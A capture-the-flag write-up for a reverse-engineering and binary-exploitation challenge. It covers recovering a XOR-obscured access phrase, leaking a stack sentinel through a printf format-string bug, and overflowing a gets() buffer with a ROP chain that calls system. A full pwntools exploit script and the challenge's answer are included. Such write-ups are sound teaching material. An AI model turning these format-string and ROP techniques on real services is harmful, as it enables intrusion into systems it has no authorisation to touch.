# Writeup: y.no.u.mad.bro

**Category:** Reverse Engineering + Binary Exploitation (Pwn)  
**Points:** 550  
**Type:** Dynamic  

---

## TL;DR

1. Reverse a rolling multi-byte XOR to recover the access phrase
2. Discover hidden menu code `31337`
3. Leak per-session stack sentinel via format string vulnerability
4. Build a ROP chain (`pop rdi; ret` → `"/bin/cat /flag"` → `system@plt`) while preserving the sentinel

---

## Recon

Connect to the service:

```
$ nc <host> 9888
```

We get a "JASWANTH" ASCII banner and a melancholic greeting about a forgotten terminal on a dead subnet. The menu:

```
1. Connect to Network
2. About This Terminal
3. Signal Echo
4. Disconnect
Choice:
```

We're also given a stripped binary to analyze locally.

---

## Step 1: Find the Hidden Menu

In `public_menu()`, the `switch` statement has a `default` branch:

```c
default:
    if (choice == 31337) {
        attempt_hidden_login();
    }
```

Entering `31337` triggers a hidden login prompt not shown in the menu.

---

## Step 2: Reverse the Rolling XOR Encryption

`attempt_hidden_login()` calls `validate_phrase()`. Disassembly reveals a rolling multi-byte XOR:

```c
int validate_phrase(const char *input, int len) {
    if (len != SECRET_LEN) return 0;
    unsigned char key = XOR_KEY;
    for (int i = 0; i < len; i++) {
        unsigned char decoded = input[i];
        for (int r = 0; r < 3; r++) {
            decoded ^= (key + r * 0x11);
        }
        if (decoded != encrypted_secret[i]) return 0;
        key = (key ^ i) + 0x07;
    }
    return 1;
}
```

The key evolves per byte. Decryption script:

```python
encrypted_secret = [...]  # extract from .rodata
XOR_KEY = 0x??            # extract from binary

def decrypt(enc, base_key):
    result = []
    key = base_key & 0xFF
    for i, b in enumerate(enc):
        val = b
        for r in range(3):
            val ^= ((key + r * 0x11) & 0xFF)
        result.append(chr(val))
        key = ((key ^ i) + 0x07) & 0xFF
    return "".join(result)

print(decrypt(encrypted_secret, XOR_KEY))
```

---

## Step 3: Leak the Sentinel via Format String

Menu option 3 ("Signal Echo") passes user input directly to `printf()`:

```c
printf(buf);
```

The function loads `SENTINEL_MAGIC` as a local variable, placing it on the stack. The sentinel is randomized per-session (`0xDEAD0000 | (time ^ pid & 0xFFFF)`).

Leak it:

```
Choice: 3
Signal: %p.%p.%p.%p.%p.%p.%p
Echo: 0x7fff...(nil).(nil).0x6.(nil).(nil).0xdead8d7b14534bc5
```

Position 7 contains a 64-bit value. Upper 32 bits = sentinel (`0xDEAD????` pattern):

```python
leaked = 0xdead8d7b14534bc5
sentinel = (leaked >> 32) & 0xFFFFFFFF
```

---

## Step 4: Enter the Hidden Console

```
Choice: 31337
Enter access phrase: THE_ONE_HAS_AWOKEN

[ACCESS GRANTED] ... someone actually came.
```

---

## Step 5: Build the ROP Chain

Menu option 2 ("Leave a Message") calls a function with `gets()` on a 64-byte buffer and a sentinel check before return. No win function exists — must ROP to `system("/bin/cat /flag")`.

Identify ROP primitives:

```
system@plt:       0x401070
"/bin/cat /flag":  0x402570
pop rdi; ret:     0x401911
ret:              0x401016
```

Stack layout (from `sub $0x50, %rsp`):

```
Offset 0x00: message[64]       (64 bytes)
Offset 0x40: padding           (12 bytes)
Offset 0x4C: sentinel          (4 bytes) ← must preserve
Offset 0x50: saved RBP         (8 bytes)
Offset 0x58: return address    ← target
```

Payload:

```python
payload  = b"A" * 64
payload += b"B" * 12
payload += p32(sentinel)
payload += b"D" * 8
payload += p64(0x401016)    # ret (alignment)
payload += p64(0x401911)    # pop rdi; ret
payload += p64(0x402570)    # "/bin/cat /flag"
payload += p64(0x401070)    # system@plt
```

---

## Step 6: Fire

```
> [payload]

Message received. He read it. He read it twice. He has nothing else to do.
flag{...}
```

---

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *
import re

context.arch = "amd64"

HOST = "challenge.ctf.example"
PORT = 9888
BINARY = "./challenge"
SECRET = "THE_ONE_HAS_AWOKEN"

SYSTEM_PLT   = 0x401070
SHELL_CMD    = 0x402570
POP_RDI_RET  = 0x401911
RET_GADGET   = 0x401016

io = remote(HOST, PORT)

io.recvuntil(b"Choice:")
io.sendline(b"3")
io.recvuntil(b"Signal:")
io.sendline(b".".join([b"%p"] * 35))
resp = io.recvuntil(b"Choice:").decode()

sentinel = None
for v in re.findall(r"0x[0-9a-fA-F]+", resp):
    val = int(v, 16)
    upper = (val >> 32) & 0xFFFFFFFF
    if (upper & 0xFFFF0000) == 0xDEAD0000 and upper != 0xDEAD0000:
        sentinel = upper
        break

assert sentinel, "Failed to leak sentinel"
log.success(f"Sentinel: {hex(sentinel)}")

io.sendline(b"31337")
io.recvuntil(b"Enter access phrase:")
io.sendline(SECRET.encode())
io.recvuntil(b"Choice:")

io.sendline(b"2")
io.recvuntil(b">")

payload  = b"A" * 64
payload += b"B" * 12
payload += p32(sentinel)
payload += b"D" * 8
payload += p64(RET_GADGET)
payload += p64(POP_RDI_RET)
payload += p64(SHELL_CMD)
payload += p64(SYSTEM_PLT)

io.sendline(payload)
print(io.recvall(timeout=5).decode(errors="replace"))
io.close()
```

---

## Key Techniques

| Technique | Where |
|-----------|-------|
| Hidden menu discovery | `default` branch checks for `31337` |
| Rolling XOR reversal | `validate_phrase()` — key evolves per byte |
| Format string leak | `echo_back()` → `printf(user_input)` leaks sentinel |
| Sentinel preservation | Correct 4-byte value at exact overflow offset |
| ROP chain | `ret` → `pop rdi; ret` → `"/bin/cat /flag"` → `system@plt` |

---

*"Message received. He read it. He read it twice. He has nothing else to do."*
